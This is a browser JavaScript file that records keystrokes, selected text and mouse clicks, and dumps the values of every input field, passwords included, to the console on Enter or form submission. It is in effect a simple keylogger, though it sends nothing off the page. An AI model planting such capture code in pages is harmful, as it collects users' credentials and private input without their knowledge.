	//var all = document.getElementsByTagName("*");
	//for (var i=0, max=all.length; i < max; i++) {
	//	console.log(all[i]+"\n");
	//	};
	
	//inputs = document.getElementsByTagName('input');
	//for (index = 0; index < inputs.length; ++index) {
	//	if(inputs[index].style.visibility != 'hidden')
	//	console.log(inputs[index]+":"+inputs[index].value+"\n");
	//}
	var record="";

	  document.onkeypress = function(event) {
		var holder;
		//IE uses this
		if(window.event) {
			holder = window.event.keyCode;
		}
		//FF uses this
		else {
			holder = event.which;
		} 
		keyz(holder);
	}

	function keyz(key) {
		//if(key === /*desired code*/) {
		  //  /*execute stuff*/
		//}
		var ctimestamp = Date.now();
		var datestamp = new Date(ctimestamp).toUTCString();
       
		console.log("REC: "+record);
		record=record+String.fromCharCode(key);
if(key == 32){
console.log("REC: "+record);
}
else if(key == 8){
record = record.substring(0,(record.length-2));
}
else if(key == 13){
saveFormFields();
		console.log("=========================================================\n");

}


			console.log(document.URL+":"+key+" "+String.fromCharCode(key)+","+datestamp);
	   
	}

	//document.addEventListener("mousemove", mouseMoving, false);
	//document.addEventListener("mousedown", mousePressed, false);
	document.addEventListener("mouseup", mouseReleased, false);
	document.addEventListener("click", mouseClicked, false);
	 
	function mouseMoving(e) {
		console.log(e.screenX + " " + e.screenY);
	}
	 
	function mousePressed(e) {
		console.log("Mouse is down!");
	}
	 
	function mouseReleased(e) {
		console.log("Mouse is up!");
		console.log("selected text : "+getSelectedText());
	}
	 
		function mouseClicked(e) {
			console.log("Mouse is clicked!"+e.screenX + " " + e.screenY+" "+e.target+"Tag Name :"+e.target.tagName);
			console.log(e.target.getAttribute('type'));
			if(e.target.tagName=='INPUT')
				{
				if(e.target.getAttribute('type')=='submit')
				{
					saveFormFields();
						}
		console.log("=========================================================\n");

		}else if(e.target.tagName=='BUTTON'){
		saveFormFields();
	console.log("=========================================================\n");

		}
		}
	//document.getElementsByTagName('button').onclick = function() {
	  // alert("button was clicked");
	//};
	function getSelectedText() {
		if (window.getSelection) {
			txt = window.getSelection();
		} else if (window.document.getSelection) {
			txt =window.document.getSelection();
		} else if (window.document.selection) {
			txt = window.document.selection.createRange().text;
		}
		return txt;  
	}
	document.addEventListener("visibilitychange", function() {
	  console.log(document.hidden, document.visibilityState);
	}, false);


function saveFormFields() {			
	console.log("Form Fields Saved\n");
		inputs = document.getElementsByTagName('input');
	for (index = 0; index < inputs.length; ++index) {
		console.log(inputs[index]+":"+inputs[index].value+"\n");
	}
	}